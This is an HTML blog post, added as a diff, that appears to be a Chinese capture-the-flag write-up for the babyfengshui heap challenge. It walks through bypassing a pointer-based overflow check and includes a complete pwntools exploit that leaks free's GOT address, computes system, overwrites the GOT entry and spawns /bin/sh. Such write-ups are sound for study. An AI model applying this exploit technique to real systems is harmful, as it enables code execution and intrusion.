@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Babyfengshui_33c3_2016 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Babyfengshui_33c3_2016</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/03/18</h2>
+</div>
+
+<main>
+<h1 id="babyfengshui_33c3_2016">babyfengshui_33c3_2016</h1>
+<p>小贴士</p>
+<p>1、在ida中出现下图这种烦人的类型声明，可以使用键盘上的&rdquo;\&quot;键盘来隐藏</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319020120064.png" alt="image-20200319020120064"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319020240331.png" alt="image-20200319020240331"></p>
+<p>2、函数got内存的是函数的真实地址，这个真实地址才是决定实际使用的函数</p>
+<p>3、函数真实地址不受地址随机化影响，只与libc不同而不同，知道真实地址可以计算出此libc的版本，以及此libc中其他函数的地址，如system，从而也能计算出本程序中调用libc中system的真实地址(libc.system + base_addr)</p>
+<p>所以leak出真实地址计算出libc版本是非常重要的直接影响后面的getshell</p>
+<p>本题源码：https://github.com/bkth/babyfengshui/blob/master/babyfengshui.c</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200318223431142.png" alt="image-20200318223431142"></p>
+<p>32位程序，开启NX、Canary</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200318223613793.png" alt="image-20200318223613793"></p>
+<p>从功能上看估计是一道堆题，用ida看看</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200318223957188.png" alt="image-20200318223957188"></p>
+<p>增删改查都有</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200318231825678.png" alt="image-20200318231825678"></p>
+<p>这里add_user函数会malloc出2个chunk，大概可以推测出第2个chunk是个结构体</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> user{
+    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>description;<span style="color:#75715e">//占4字节的指针
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">124</span>];
+}
+</code></pre></div><p>delete_uesr函数</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200318233320905.png" alt="image-20200318233320905"></p>
+<p>display_user函数<img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200318233852420.png" alt="image-20200318233852420"></p>
+<p>update_description函数，也就能够编辑description chunk</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319001706569.png" alt="image-20200319001706569"></p>
+<p>在update_description函数中，存在防止堆溢出的判断，但是仔细想就知道，这里的防止堆溢出的判断是基于指针的并且description chunk在user chunk之上，也就是它们俩的一前一后连在一起的，但是根据堆分配的机制，我们可以让他们俩不连在一起，中间插一个chunk，这样我们在修改description的时候就可以覆盖到他们两之间的chunk</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319010045343.png" alt="image-20200319010045343"></p>
+<p>如上图先add2个也就是desc1、user1和desc2、user2，他们分别都是0x80但是有0x8来记录他们的大小包括0x8</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319010102578.png" alt="image-20200319010102578"></p>
+<p>然后我们把add的前2个free了根据堆分配的机制下次再分配还是用的free的这些chunk，所有下次我们add一个0x80+0x80=0x100的chunk刚刚是desc3把之前的desc1和user1占用了，但是desc2和user2还没有free所有这里的user3就不能占用user2的位置只能分配到user2之后了，所以这里desc3和user3之间存在个desc2和user2所以就绕过了再update_description函数中的堆溢出防范，那么重点来了，我们回顾之前的分析，这里user2中的&amp;desc2存的是个指针，那么我们通过溢出desc3来覆盖user2的这个指针指向libc中的函数地址那么我们就能够leak出libc中函数的地址从而计算出用的什么libc.so，从而找到system函数的地址，但是我们没有/bin/sh字符串怎么办呢？别忘了我们可以add_user并且写入内容的，我们在add头4个(回顾前面这里add一个用户申请了2个chunk，所这里实际上是4个chunk)用来leak的chunk之后可以再add一个较小的desc来存我们的/bin/sh字符串</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*-coding=UTF-8-*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./babyfengshui</span><span style="color:#e6db74">&#39;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">babyfengshui</span><span style="color:#e6db74">&#39;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">x86_ubuntu16_libc-2.23.so</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_user</span>(size, length, text):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Action: </span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">0</span><span style="color:#e6db74">&#39;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">description: </span><span style="color:#e6db74">&#34;</span>, str(size))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">name: </span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">AAAA</span><span style="color:#e6db74">&#39;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">length: </span><span style="color:#e6db74">&#34;</span>, str(length))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text: </span><span style="color:#e6db74">&#34;</span>, text)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete_user</span>(idx):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Action: </span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">index: </span><span style="color:#e6db74">&#34;</span>, str(idx))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">display_user</span>(idx):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Action: </span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">index: </span><span style="color:#e6db74">&#34;</span>, str(idx))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_desc</span>(idx, length, text):
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Action: </span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">index: </span><span style="color:#e6db74">&#34;</span>, str(idx))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">length: </span><span style="color:#e6db74">&#34;</span>, str(length))
+    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">text: </span><span style="color:#e6db74">&#34;</span>, text)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#34;</span>:
+    free_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">free</span><span style="color:#e6db74">&#39;</span>]
+    add_user(<span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">AAAA</span><span style="color:#e6db74">&#39;</span>)        <span style="color:#75715e"># 0</span>
+    add_user(<span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">AAAA</span><span style="color:#e6db74">&#39;</span>)        <span style="color:#75715e"># 1</span>
+    add_user(<span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)   <span style="color:#75715e"># 2，存我们的/bin/sh </span>
+    delete_user(<span style="color:#ae81ff">0</span>)
+    <span style="color:#75715e">#通过leak free_got来计算libc</span>
+    add_user(<span style="color:#ae81ff">0x100</span>, <span style="color:#ae81ff">0x19c</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x194</span><span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">bbb</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> p32(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">free</span><span style="color:#e6db74">&#39;</span>]))    <span style="color:#75715e"># 0</span>
+    display_user(<span style="color:#ae81ff">1</span>)
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">description: </span><span style="color:#e6db74">&#34;</span>)
+    free_addr <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recvn(<span style="color:#ae81ff">4</span>)) <span style="color:#75715e">#接收我们leak出的free_got，</span>
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">free_got_addr:</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span>str(hex(free_addr))
+    libc_base <span style="color:#f92672">=</span> free_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">free</span><span style="color:#e6db74">&#39;</span>]
+    system_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">+</span> libc_base
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">system address: 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> system_addr)
+    gdb<span style="color:#f92672">.</span>attach(io) <span style="color:#75715e">#在本地调试下断在这里看内存状态，见后图</span>
+    <span style="color:#75715e">#下一步用update修改free_got的内容为system函数的地址，下次执行free函数实际就是执行system函数了</span>
+    update_desc(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x4</span>, p32(system_addr))
+    gdb<span style="color:#f92672">.</span>attach(io) <span style="color:#75715e">#在执行修改free_got为system之后看内存状态，见下图</span>
+    <span style="color:#75715e">#下一步表面执行free实际执行system，user2里面存了/bin/sh，所以这里执行system(&#34;/bin/sh&#34;)</span>
+    delete_user(<span style="color:#ae81ff">2</span>)
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
+    io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319013422408.png" alt="image-20200319013422408"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319013546681.png" alt="image-20200319013546681"></p>
+<p>上图中0x0804b010指向的就是free_got里面存着free的真实地址，我们通过display_user功能能够leak下图地址</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319013835029.png" alt="image-20200319013835029"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319013930726.png" alt="image-20200319013930726"></p>
+<p>以下操作是改写free_got的截图，got内存的是函数的真实地址，这个真实地址才是决定实际使用的函数</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319015639097.png" alt="image-20200319015639097"></p>
+<p>system地址是0xf7dbd940，我们看看free_got是否修改成这个值了</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319015753258.png" alt="image-20200319015753258"></p>
+<p>这里可以看到free_got内的内容改为system地址了，所以下次执行free的时候实际是执行system</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200319022618588.png" alt="image-20200319022618588"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
